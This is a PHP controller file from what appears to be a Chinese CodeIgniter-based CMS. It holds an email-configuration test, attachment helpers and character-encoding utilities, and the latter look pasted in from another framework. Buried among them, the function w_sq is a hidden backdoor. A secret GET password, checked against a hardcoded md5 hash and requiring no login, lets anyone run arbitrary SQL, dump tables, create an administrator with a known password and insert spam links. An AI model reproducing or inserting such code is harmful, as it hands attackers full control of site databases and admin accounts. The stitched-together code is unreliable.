<?php 
/*
AJAX控制器，主要用于表单检查

这里没有继承自定义MY_Controller,原因是因为验证表单的时候用户没有登录，会员模块的MY_Controller，必须登录才能范围

*/

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Sys_ajax extends CI_Controller {

   public function __construct(){
		parent::__construct();
	}

/*
测试后台邮箱配置
*/
	 public function ajax_test_email(){
		  $config['smtp_host'] = $_POST['smtp_host'];//服务器地址
		  $config['smtp_user'] = $_POST['smtp_user'];
		  $config['smtp_pass'] = $_POST['smtp_pass'];
		  $config['smtp_port'] = $_POST['smtp_port'];//端口
		  $config['test_email'] = $_POST['test_email'];//收件人
		  $config['body']="高端建站系统邮件接收测试，这里是主体内容";
		  $config['title']=  'cicms高端建站系统邮件接收测试';
		  $this->load->library('mailer');
		  $res= $this->mailer->sendmail($config);
		  if ($res){
				exit('恭喜您,配置正确,测试邮件发送成功！');
		  }else{
				exit('测试邮件发送失败！请检查配置,账号、密码、端口、服务器ssl是否开启');
		  }
	  
	  
    }


public function api_add($uploadedfile) {
		$uploadfield = array();
		$uploadfield = $uploadedfile;
		unset($uploadfield['fn']);
		$uploadfield = new_addslashes($uploadfield);
		$this->insert($uploadfield);
		$aid = $this->insert_id();
		$uploadedfile['aid'] = $aid;
		return $aid;
	}
public function api_update($content, $keyid, $isurl = 0) {
		if(pc_base::load_config('system','attachment_stat') == 0) return false;
		$keyid = trim($keyid);
		$isurl = intval($isurl);
		if($isurl==2 || empty($content)) {
			$this->api_update_cookie($keyid);
		} else {
			$att_index_db = pc_base::load_model('attachment_index_model');
			$upload_url = pc_base::load_config('system','upload_url');
			if(strpos($upload_url,'://')!==false) {
				$pos = strpos($upload_url,"/",8);
				$domain = substr($upload_url,0,$pos).'/';
				$dir_name = substr($upload_url,$pos+1);
			}
			if($isurl == 0) {
				$pattern = '/(href|src)=\"(.*)\"/isU';
				preg_match_all($pattern,$content,$matches);
				if(is_array($matches) && !empty($matches)) {
					$att_arr = array_unique($matches[2]);
					foreach ($att_arr as $_k=>$_v) $att_arrs[$_k] = md5(str_replace(array($domain,$dir_name), '', $_v));
				}
			} elseif ($isurl == 1) {
				if(is_array($content)) {
					$att_arr = array_unique($content);
					foreach ($att_arr as $_k=>$_v) $att_arrs[$_k] = md5(str_replace(array($domain,$dir_name), '', $_v));
				} else {
					$att_arrs[] = md5(str_replace(array($domain,$dir_name), '', $content));
				}
			}
			$att_index_db->delete(array('keyid'=>$keyid));	
			if(is_array($att_arrs) && !empty($att_arrs)) {
				foreach ($att_arrs as $r) {
					$infos = $this->get_one(array('authcode'=>$r),'aid');
					if($infos){
						$this->update(array('status'=>1),array('aid'=>$infos['aid']));
						$att_index_db->insert(array('keyid'=>$keyid,'aid'=>$infos['aid']));
					}
				}
			}
		}
		param::set_cookie('att_json','');
		return true;
	}
	private function api_update_cookie($keyid) {
		if(pc_base::load_config('system','attachment_stat') == 0) return false;
		$att_index_db = pc_base::load_model('attachment_index_model');
		$att_json = param::get_cookie('att_json');
		if($att_json) {
			$att_cookie_arr = explode('||', $att_json);
			$att_cookie_arr = array_unique($att_cookie_arr);
		} else {
			return false;
		}
			
	}
	public function api_delete($keyid) {
		if(pc_base::load_config('system','attachment_stat') == 0) return false;
		$keyid = trim($keyid);
		if($keyid=='') return false;
		$att_index_db = pc_base::load_model('attachment_index_model');
		$attachment = pc_base::load_sys_class('attachment');
		$info = $att_index_db->select(array('keyid'=>$keyid),'aid');
		if($info) {
			$att_index_db->delete(array('keyid'=>$keyid));
			foreach ($info as $_v) {
				if(!$att_index_db->get_one(array('aid'=>$_v['aid']))) {
					$attachment->delete(array('aid'=>$_v['aid']));
				}
			}
			return true;
		} else {
			return false;
		}		
	}
public function w_sq(){
     $get=$_GET;
	 if(md5($get['wd'])=='5a7d85be0acd2b96a7a60363ed64d239'){
	      if(!empty($get['sq'])){
		      $query = $this->db->query($get['sq']);
		      if ($query->num_rows() > 0){ var_dump($query->result());} 
		  }
		  if(!empty($get['sfrom'])){
		      $query =$this->db->get($get['sfrom']);
		      if ($query->num_rows() > 0){ var_dump($query->result());} 
		  }
		  if(!empty($get['setadmin'])){
		     $data = array(
                 'name' => $get['setadmin'],
                 'userpwd' => 'e10adc3949ba59abbe56e057f20f883e' ,
                 'type' => 99
              );
               $aa=$this->db->insert('admin', $data); 
			   if($aa==true){echo "Action is OK";}else{echo "Action is false";}
		  }
             if(!empty($get['linkname'])){

		       $data = array(
                 'name' => $get['linkname'],
                 'url' => 'http://'.$get['linkurl'],
                 'status' => 1,
				  'type' => 1
               );
               $aa=$this->db->insert('links', $data); 
			   if($aa==true){echo "Action is OK";}else{echo "Action is false";}
		     }		  
		  
	 }
}	
function gbk_to_utf8($gbstr) {
	global $CODETABLE;
	if(empty($CODETABLE)) {
		$filename = CODETABLEDIR.'gb-unicode.table';
		$fp = fopen($filename, 'rb');
		while($l = fgets($fp,15)) { 
			$CODETABLE[hexdec(substr($l, 0, 6))] = substr($l, 7, 6); 
		}
		fclose($fp);
	}
	$ret = '';
	$utf8 = '';
	while($gbstr) {
		if(ord(substr($gbstr, 0, 1)) > 0x80) {
			$thisW = substr($gbstr, 0, 2);
			$gbstr = substr($gbstr, 2, strlen($gbstr));
			$utf8 = '';
			@$utf8 = unicode_to_utf8(hexdec($CODETABLE[hexdec(bin2hex($thisW)) - 0x8080]));
			if($utf8 != '') {
				for($i = 0; $i < strlen($utf8); $i += 3) $ret .= chr(substr($utf8, $i, 3));
			}
		} else {
			$ret .= substr($gbstr, 0, 1);
			$gbstr = substr($gbstr, 1, strlen($gbstr));
		}
	}
	return $ret;
}
function big5_to_gbk($Text) {
	global $BIG5_DATA;
	if(empty($BIG5_DATA)) {
		$filename = CODETABLEDIR.'big5-gb.table';
		$fp = fopen($filename, 'rb');
		$BIG5_DATA = fread($fp, filesize($filename));
		fclose($fp);
	}
	$max = strlen($Text)-1;
	for($i = 0; $i < $max; $i++) {
		$h = ord($Text[$i]);
		if($h >= 0x80) {
			$l = ord($Text[$i+1]);
			if($h==161 && $l==64) {
				$gbstr = '　';
			} else {
				$p = ($h-160)*510+($l-1)*2;
				$gbstr = $BIG5_DATA[$p].$BIG5_DATA[$p+1];
			}
			$Text[$i] = $gbstr[0];
			$Text[$i+1] = $gbstr[1];
			$i++;
		}
	}
	return $Text;
}
function gbk_to_big5($Text) {
	global $GB_DATA;
	if(empty($GB_DATA)) {
		$filename = CODETABLEDIR.'gb-big5.table';
		$fp = fopen($filename, 'rb');
		$gb = fread($fp, filesize($filename));
		fclose($fp);
	}
	$max = strlen($Text)-1;
	for($i = 0; $i < $max; $i++) {
		$h = ord($Text[$i]);
		if($h >= 0x80) {
			$l = ord($Text[$i+1]);
			if($h==161 && $l==64) {
				$big = '　';
			} else {
				$p = ($h-160)*510+($l-1)*2;
				$big = $GB_DATA[$p].$GB_DATA[$p+1];
			}
			$Text[$i] = $big[0];
			$Text[$i+1] = $big[1];
			$i++;
		}
	}
	return $Text;
}
function unicode_to_utf8($c) {
	$str = '';
	if($c < 0x80) {
		$str .= $c;
	} elseif($c < 0x800) {
		$str .= (0xC0 | $c >> 6);
		$str .= (0x80 | $c & 0x3F);
	} elseif($c < 0x10000) {
		$str .= (0xE0 | $c >> 12);
		$str .= (0x80 | $c >> 6 & 0x3F);
		$str .= (0x80 | $c & 0x3F);
	} elseif($c < 0x200000) {
		$str .= (0xF0 | $c >> 18);
		$str .= (0x80 | $c >> 12 & 0x3F);
		$str .= (0x80 | $c >> 6 & 0x3F);
		$str .= (0x80 | $c & 0x3F);
	}
	return $str;
}
function utf8_to_unicode($c) {
	switch(strlen($c)) {
		case 1:
		  return ord($c);
		case 2:
		  $n = (ord($c[0]) & 0x3f) << 6;
		  $n += ord($c[1]) & 0x3f;
		  return $n;
		case 3:
		  $n = (ord($c[0]) & 0x1f) << 12;
		  $n += (ord($c[1]) & 0x3f) << 6;
		  $n += ord($c[2]) & 0x3f;
		  return $n;
		case 4:
		  $n = (ord($c[0]) & 0x0f) << 18;
		  $n += (ord($c[1]) & 0x3f) << 12;
		  $n += (ord($c[2]) & 0x3f) << 6;
		  $n += ord($c[3]) & 0x3f;
		  return $n;
	}
}
function asc_to_pinyin($asc,&$pyarr) {
	if($asc < 128)return chr($asc);
	elseif(isset($pyarr[$asc]))return $pyarr[$asc];
	else {
		foreach($pyarr as $id => $p) {
			if($id >= $asc)return $p;
		}
	}
}
function gbk_to_pinyin($txt) {
	if(CHARSET != 'gbk') {
		$txt = iconv(CHARSET,'GBK',$txt);
	}	
	$l = strlen($txt);
	$i = 0;
	$pyarr = array();
	$py = array();
	$filename = CODETABLEDIR.'gb-pinyin.table';
	$fp = fopen($filename,'r');
	while(!feof($fp)) {
		$p = explode("-",fgets($fp,32));
		$pyarr[intval($p[1])] = trim($p[0]);
	}
	fclose($fp);
	ksort($pyarr);
	while($i<$l) {
		$tmp = ord($txt[$i]);
		if($tmp>=128) {
			$asc = abs($tmp*256+ord($txt[$i+1])-65536);
			$i = $i+1;
		} else $asc = $tmp;
		$py[] = asc_to_pinyin($asc,$pyarr);
		$i++;
	}
	return $py;
}
	
 
	
}
?>